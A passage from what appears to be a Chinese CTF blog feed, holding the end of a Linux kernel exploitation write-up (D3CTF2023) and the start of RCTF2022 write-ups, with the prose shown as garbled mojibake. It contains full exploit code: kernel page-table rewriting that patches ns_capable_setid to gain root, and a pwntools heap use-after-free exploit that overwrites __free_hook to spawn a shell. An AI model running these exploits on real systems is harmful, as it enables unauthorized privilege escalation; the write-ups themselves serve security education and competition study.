class="line">            pud_addr = (*(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PGD_ENTRY(dst_vaddr)) &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">            pud_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">            arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pud_addr), buf);</span><br><span class="line">            pmd_addr = (*(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PUD_ENTRY(dst_vaddr)) &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">            pmd_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">            arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pmd_addr), buf);</span><br><span class="line">            dst_paddr = (*(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PMD_ENTRY(dst_vaddr)) &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line"></span><br><span class="line">            dst_paddr += <span class="number">0x1000</span> * PTE_ENTRY(dst_vaddr);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Got ns_capable_setid&#x27;s phys addr: \033[0m&quot;</span></span><br><span class="line">                   <span class="string">&quot;0x%lx\n\n&quot;</span>,</span><br><span class="line">                   dst_paddr);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">size_t</span> pte_addr;</span><br><span class="line">            &#123;</span><br><span class="line">                arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pgd_addr), buf);</span><br><span class="line">                pud_addr = (*(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PGD_ENTRY(<span class="number">0x114514000</span>)) &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">                pud_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">                arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pud_addr), buf);</span><br><span class="line">                pmd_addr = (*(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PUD_ENTRY(<span class="number">0x114514000</span>)) &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">                pmd_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">                arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pmd_addr), buf);</span><br><span class="line">                pte_addr = (*(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PMD_ENTRY(<span class="number">0x114514000</span>)) &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">                pte_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">                arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pte_addr), buf);</span><br><span class="line">                *(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PTE_ENTRY(<span class="number">0x114514000</span>)) = dst_paddr | <span class="number">0x8000000000000867</span>;</span><br><span class="line">                arbitrary_write_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pte_addr), buf, <span class="number">0xff0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            &#123;</span><br><span class="line">                arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pgd_addr), buf);</span><br><span class="line">                pud_addr = (*(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PGD_ENTRY(<span class="number">0x114514000</span> + <span class="number">0x1000</span>)) &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">                pud_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">                arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pud_addr), buf);</span><br><span class="line">                pmd_addr = (*(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PUD_ENTRY(<span class="number">0x114514000</span> + <span class="number">0x1000</span>)) &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">                pmd_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">                arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pmd_addr), buf);</span><br><span class="line">                pte_addr = (*(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PMD_ENTRY(<span class="number">0x114514000</span> + <span class="number">0x1000</span>)) &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">                pte_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">                arbitrary_read_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pte_addr), buf);</span><br><span class="line">                *(<span class="keyword">size_t</span> *)((<span class="keyword">size_t</span> *)buf + PTE_ENTRY(<span class="number">0x114514000</span> + <span class="number">0x1000</span>)) = (dst_paddr + <span class="number">0x1000</span>) | <span class="number">0x8000000000000867</span>;</span><br><span class="line">                arbitrary_write_by_pipe((<span class="keyword">void</span> *)direct_map_addr_to_page_addr(pte_addr), buf, <span class="number">0xff0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[*] Start overwriting kernel code segment...&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">             * The setresuid() check for user&#x27;s permission by ns_capable_setid(),</span></span><br><span class="line"><span class="comment">             * so we can just patch it to let it always return true :)</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="built_in">memset</span>(kcode_map + (NS_CAPABLE_SETID &amp; <span class="number">0xfff</span>), <span class="string">&#x27;\x90&#x27;</span>, <span class="number">0x40</span>);</span><br><span class="line">            <span class="built_in">memcpy</span>(kcode_map + (NS_CAPABLE_SETID &amp; <span class="number">0xfff</span>) + <span class="number">0x40</span>,</span><br><span class="line">                   <span class="string">&quot;\xf3\x0f\x1e\xfa&quot;</span></span><br><span class="line">                   <span class="string">&quot;H\xc7\xc0\x01\x00\x00\x00&quot;</span></span><br><span class="line">                   <span class="string">&quot;\xc3&quot;</span>,</span><br><span class="line">                   <span class="number">12</span>);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[*] trigger evil ns_capable_setid() in setresuid()...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">            sleep(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">            setresuid(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">            get_shell();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230524153518128.png"                      alt="image-20230524153518128"                ><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230524160032198.png"                      alt="image-20230524160032198"                ><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230524162232568.png"                      alt="image-20230524162232568"                ></p><h3 id="æœ¬äººå½“æ—¶åšçš„ç¬¨åŠæ³•"><a href="#æœ¬äººå½“æ—¶åšçš„ç¬¨åŠæ³•" class="headerlink" title="æœ¬äººå½“æ—¶åšçš„ç¬¨åŠæ³•"></a>æœ¬äººå½“æ—¶åšçš„ç¬¨åŠæ³•</h3><p>å› ä¸ºå½“æ—¶æ³¨æ„åˆ°å­˜åœ¨<code>off by null</code>æ¼æ´ï¼Œç¬¬ä¸€ååº”å°±æ˜¯åˆ©ç”¨<code>msg_msg</code>ç»“æ„ä½“æ¥åšè¿™é“é¢˜ã€‚å±äºæ˜¯ççŒ«ç¢°åˆ°æ­»è€—å­ï¼Œæˆ‘åœ¨æ²¡æœ‰è€ƒè™‘é¡µçº§å †é£æ°´çš„æƒ…å†µä¸‹ç”³è¯·çš„<code>msg_msg</code>çš„<code>order</code>æ­£å¥½ä¸º3ï¼Œä¹Ÿå¯¼è‡´æœ‰ä¸€å®šçš„å‡ ç‡èƒ½å¤Ÿè¾¾åˆ°UAFçš„æ•ˆæœã€‚è‡ªç„¶ï¼Œæˆ‘çš„ç¬¬ä¸€ååº”ä¹Ÿæ˜¯ä¿®æ”¹<code>cred</code>ç»“æ„ä½“ï¼Œè™½ç„¶èƒ½å¤ŸæˆåŠŸæ‰¾åˆ°ä½†æ˜¯æˆåŠŸç‡ååˆ†çš„ä½ï¼Œæ¯æ¬¡è°ƒè¯•éœ€è¦æ‰‹åŠ¨è·‘äºŒåå¤šåˆ†é’Ÿï¼Œå› ä¸ºå†…å­˜ä¸­æœ‰ä¸€å¤§å—å­˜æ”¾ç€å„ç§æŒ‡é’ˆï¼Œå¯¼è‡´æ— æ³•ç»§ç»­å¾€ä¸‹æœç´¢å‡ºç°<code>kernel panic</code>ï¼Œå¹¶ä¸”åœ¨æ”¹å›æ™®é€šç”¨æˆ·æƒé™åå‡ºç°äº†è¿™ç¯‡æ–‡ç« å¼€å¤´éƒ¨åˆ†æåˆ°çš„<code>io_uring</code>çš„é—®é¢˜ï¼Œæ‰€ä»¥ä¹Ÿå°±æ”¾å¼ƒäº†è¿™ä¸€æ–¹æ³•ã€‚</p><p>ç„¶è€Œï¼Œå› ä¸ºå½“æ—¶ä¸æ¸…æ¥šCFIçš„ä½œç”¨åˆè·‘å»æ”¹opså»äº†ï¼Œè°ƒäº†åŠå¤©å‘ç°æ°¸è¿œä¼šåœ¨æœ€åä¸€æ­¥é€ æˆ<code>panic</code>ï¼Œå¹¶ä¸”ä¹Ÿæ²¡æœ‰æ‰¾åˆ°å¯ä»¥ç”¨æ¥å®ç°æ ˆè¿ç§»çš„<code>gadget</code>ï¼Œæ‰€ä»¥è¿™ä¸ªæ–¹æ³•ä¹Ÿè¢«æ”¾å¼ƒäº†ã€‚åˆšåˆšç»“æŸæ¯”èµ›çœ‹äº†NULLçš„wpä¹‹åå°±è§‰å¾—è‡ªå·±æ˜¯çœŸçš„å¤ªè ¢äº†ï¼Œåˆ†æ˜å¯ä»¥ç›´æ¥ä¿®æ”¹<code>pipe_buffer</code>äº†å±…ç„¶æ²¡æœ‰æƒ³åˆ°<code>Dirty Pipe</code>ï¼Œè™½ç„¶å¢¨æ™šé¸¢ä½¬è¯´è¿™ä¸æ˜¯æœ€ä¼˜è§£ï¼Œä½†æ˜¯æ˜¯æˆ‘å”¯ä¸€èƒ½å¤Ÿåšå‡ºæ¥çš„æ–¹æ³•æˆ‘å±…ç„¶æ²¡æƒ³åˆ°ï¼Œæˆ‘æ˜¯çœŸçš„è ¢ï¼ï¼ï¼</p><hr><p>å‚è€ƒé“¾æ¥ï¼š</p><p>â€‹    <a class="link"   href="https://arttnba3.cn/2023/05/02/CTF-0X08_D3CTF2023_D3KCACHE/#Final-Exploitation" >https://arttnba3.cn/2023/05/02/CTF-0X08_D3CTF2023_D3KCACHE/#Final-Exploitation<i class="fas fa-external-link-alt"></i></a></p><p>â€‹    <a class="link"   href="https://elixir.bootlin.com/linux/v6.2.12/source" >https://elixir.bootlin.com/linux/v6.2.12/source<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img  
                     lazyload
                     src=&quot;/images/loading.svg&quot;
                     data-src=&quot;/images/image-20230510</summary>
      
    
    
    
    <category term="kernel-pwn" scheme="https://cv196082.gitee.io/categories/kernel-pwn/"/>
    
    
    <category term="msg_msg" scheme="https://cv196082.gitee.io/tags/msg-msg/"/>
    
    <category term="pipe_buffer" scheme="https://cv196082.gitee.io/tags/pipe-buffer/"/>
    
    <category term="io_uring" scheme="https://cv196082.gitee.io/tags/io-uring/"/>
    
    <category term="é¡µçº§å †é£æ°´" scheme="https://cv196082.gitee.io/tags/%E9%A1%B5%E7%BA%A7%E5%A0%86%E9%A3%8E%E6%B0%B4/"/>
    
  </entry>
  
  <entry>
    <title>RCTF2022å¤ç°</title>
    <link href="https://cv196082.gitee.io/2023/04/22/RCTF2022%E5%A4%8D%E7%8E%B0/"/>
    <id>https://cv196082.gitee.io/2023/04/22/RCTF2022%E5%A4%8D%E7%8E%B0/</id>
    <published>2023-04-22T05:35:06.000Z</published>
    <updated>2023-04-24T12:39:40.207Z</updated>
    
    <content type="html"><![CDATA[<h2 id="diary"><a href="#diary" class="headerlink" title="diary"></a>diary</h2><h3 id="åˆ©ç”¨åˆ†æ"><a href="#åˆ©ç”¨åˆ†æ" class="headerlink" title="åˆ©ç”¨åˆ†æ"></a>åˆ©ç”¨åˆ†æ</h3><p>å°±æ˜¯ä¸€é“å¾ˆæ­£å¸¸çš„ç”¨æˆ·æ€å †é¢˜ã€‚åœ¨<code>delete</code>å‡½æ•°ä¸­å­˜åœ¨UAFæ¼æ´ã€‚</p><p>ä¸è¿‡é¢˜ç›®çš„é€†å‘è¿‡ç¨‹æ¯”è¾ƒéº»çƒ¦ï¼ŒåŠ ä¹‹æˆ‘å¼€å§‹æ²¡æ³¨æ„åˆ°é¢˜ç›®å·²ç»ç»™äº†è¾“å…¥commandçš„æ ¼å¼ï¼Œå¦‚æœæ³¨æ„åˆ°çš„è¯åŠ¨æ€è°ƒè¯•æ¥é€†å‘æ›´ä¸ºç®€å•ã€‚</p><p>é¢˜ç›®å¾ˆç®€å•ï¼Œåˆ©ç”¨UAFä½¿å¾—<code>tcache</code>å’Œ<code>unsorted bin</code>ä¸­åŒæ—¶å­˜åœ¨ä¸€ä¸ªchunkï¼Œæ³„æ¼å‡ºlibcåœ°å€ã€‚åˆ©ç”¨<code>encrypt</code>å‡½æ•°åˆ†é…åˆ°<code>unsorted bin</code>ä¸­çš„chunkè¿›è€Œä¿®æ”¹åˆ°tcacheä¸­chunkçš„fdæŒ‡é’ˆæŒ‡å‘<code>__free_hook</code>å³å¯ã€‚</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">r = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;input your test cmd:&#x27;</span>)</span><br><span class="line">    payload = <span class="string">&#x27;add#1#1#1#1#1#&#123;&#125;#&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(idx), content)</span><br><span class="line">    payload = <span class="built_in">bytes</span>(payload, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;input your test cmd:&#x27;</span>)</span><br><span class="line">    payload = <span class="string">&#x27;update#&#123;&#125;#&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(idx), content)</span><br><span class="line">    payload = <span class="built_in">bytes</span>(payload, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;input your test cmd:&#x27;</span>)</span><br><span class="line">    payload = <span class="string">&#x27;show#&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(idx))</span><br><span class="line">    payload = <span class="built_in">bytes</span>(payload, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;input your test cmd:&#x27;</span>)</span><br><span class="line">    payload = <span class="string">&#x27;delete#&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(idx))</span><br><span class="line">    payload = <span class="built_in">bytes</span>(payload, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">idx, offset, length</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;input your test cmd:&#x27;</span>)</span><br><span class="line">    payload = <span class="string">&#x27;encrypt#&#123;&#125;#&#123;&#125;#&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(idx), <span class="built_in">str</span>(offset), <span class="built_in">str</span>(length))</span><br><span class="line">    payload = <span class="built_in">bytes</span>(payload, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">    create(i, <span class="built_in">str</span>(i))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    delete(<span class="number">10</span>-i)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;1.1.1 1:1:4\n&#x27;</span>)</span><br><span class="line">heap_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x13a30</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;heap_base:&quot;</span>, <span class="built_in">hex</span>(heap_base))</span><br><span class="line">update(<span class="number">3</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;1.1.1 1:1:4\n&#x27;</span>)</span><br><span class="line">libc_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x1ecbe0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base:&quot;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base+<span class="number">0x1eee48</span></span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;input your test cmd:&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;update#0#&#x27;</span> + flat(free_hook-<span class="number">4</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">encrypt(<span class="number">0</span>, <span class="number">4</span>, <span class="number">6</span>)</span><br><span class="line">update(<span class="number">0</span>, <span class="string">&#x27;A&#x27;</span>*(<span class="number">0x2c0</span>-<span class="number">0x16</span>))</span><br><span class="line">create(<span class="number">40</span>, <span class="string">&#x27;/bin/sh;&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;input your test cmd:&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;add#1#1#1#1#1#41#&#x27;</span>+flat(system_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜æˆ‘åœ¨ä¸‹é¢è¿™ä¸ªä½ç½®è¿™é‡Œç ´é˜²äº†ï¼Œä¸€ç›´æ— æ³•<code>double free</code>æˆ‘è¿˜ä»¥ä¸ºæ˜¯glibcä¸­æ£€æŸ¥äº†åˆä¸æŠ¥é”™ï¼Œå»ç¿»äº†æºç å‘ç°ä¼šæœ‰æŠ¥é”™ï¼Œè¿™æ‰çœ‹äº†é¢˜ç›®è¿™é‡Œå±…ç„¶æœ‰è¿™æ ·ä¸€ä¸ªéªŒè¯å±äºæ˜¯æœ‰ç‚¹å„¿æ¶å¿ƒäººäº†ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_BOOL8 __fastcall <span class="title">sub_43CC</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">memcmp</span>(*(<span class="keyword">const</span> <span class="keyword">void</span> **)(a1 + <span class="number">0x10</span>), <span class="string">&quot;    &quot;</span>, <span class="number">4uLL</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">sub_4194</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( *(_QWORD *)(a1 + <span class="number">0x10</span>) &amp;&amp; (<span class="keyword">unsigned</span> __int8)sub_43CC(a1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(_QWORD *)(a1 + <span class="number">0x10</span>) )</span><br><span class="line">      <span class="keyword">operator</span> <span class="keyword">delete</span>[](*(<span class="keyword">void</span> **)(a1 + <span class="number">0x10</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ez-atm"><a href="#ez-atm" class="headerlink" title="ez_atm"></a>ez_atm</h2><h3 id="åˆ©ç”¨åˆ†æ-1"><a href="#åˆ©ç”¨åˆ†æ-1" class="headerlink" title="åˆ©ç”¨åˆ†æ"></a>åˆ©ç”¨åˆ†æ</h3><p>é¢˜ç›®éš¾åº¦ä¾æ—§ä¸æ˜¯å¾ˆå¤§ï¼Œä½†æ˜¯æˆ‘æ²¡æƒ³æ˜ç™½çš„æ˜¯ï¼Œä¸€å¼€å§‹æˆ‘å¯ä»¥gdbå»è°ƒè¯•æœåŠ¡ç«¯ç¨‹åºï¼Œä½†æ˜¯åé¢å´ä¸€ç›´å¡åœ¨acceptäº†ï¼Œæœ‰å¤§ä½¬çŸ¥é“çš„è¯å¯ä»¥ç•™è¨€å‘Šè¯‰æˆ‘ä¸€ä¸‹æ€ä¹ˆå›äº‹ã€‚ä¹Ÿæ­£æ˜¯å› ä¸ºè¿™é“é¢˜ç›®æ¯”è¾ƒç®€å•æ‰å¯ä»¥åœ¨ä¸è°ƒè¯•çš„æƒ…å†µä¸‹ç›´æ¥æ‰“ã€‚</p><p>è¿™é“é¢˜é€†å‘åˆ†æè¿‡ç¨‹ä¹Ÿä¸ç®—å¾ˆéš¾ï¼Œå­˜åœ¨ä¸‰å¤„æ¼æ´ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">stat_query</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  reply_message(<span class="number">1</span>, a1);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°ä¸­è¿”å›çš„ä¾æ—§æ˜¯<code>0x84</code>ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥å°±å¯ä»¥è¯»å–åˆ°è¿”å›åœ°å€ä¹Ÿå°±æ˜¯libcä¸Šçš„åœ°å€äº†ï¼Œä»è€Œæ‹¿åˆ°libcåœ°å€ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">query</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  reply_message(<span class="number">1</span>, user_list[user_id]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">2LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒå¤„è·Ÿç¬¬ä¸€å¤„ç±»ä¼¼ï¼Œä¸åŒçš„æ˜¯è¿™é‡Œæ˜¯è¶Šç•Œè¯»å–å †ä¸Šçš„å†…å®¹ï¼Œé‚£ä¹ˆå¯ä»¥æ³„æ¼å‡ºå †åœ°å€ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">cancellation</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">5</span>; i &gt; <span class="number">0</span>; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( check_passwrod(user_id, &amp;password) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>((<span class="keyword">void</span> *)user_list[user_id]);</span><br><span class="line">      user_id = <span class="number">-1</span>;</span><br><span class="line">      reply_message(<span class="number">1</span>, (__int64)<span class="string">&quot;The target account has been cancelled.&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( i != <span class="number">1</span> )</span><br><span class="line">      reply_message(<span class="number">2</span>, (__int64)<span class="string">&quot;password error.Try again.&quot;</span>);</span><br><span class="line">    get_message();</span><br><span class="line">  &#125;</span><br><span class="line">  reply_message(</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    (__int64)<span class="string">&quot;The password has been entered incorrectly for more than 5 times, and your account has been 